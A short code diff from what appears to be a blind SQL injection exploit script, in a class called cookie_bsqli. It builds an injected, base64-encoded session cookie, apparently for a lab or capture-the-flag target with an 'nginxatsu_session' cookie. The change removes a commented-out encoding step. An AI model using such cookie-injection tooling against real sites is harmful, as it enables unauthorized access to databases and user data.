@@ -106,7 +106,7 @@ class cookie_bsqli:
 		Convert cookie_dict to json then base64 and url encode it
 		"""
 		cookie_payload = json.dumps(cookie_dict).encode()
-		b64_cookie_payload = b64encode(cookie_payload).decode()#.replace('=', '%3D').replace('\\','')
+		b64_cookie_payload = b64encode(cookie_payload).decode()
 
 		"""
 		Now set the current session cookie's to our injected cookie + nginxatsu_session
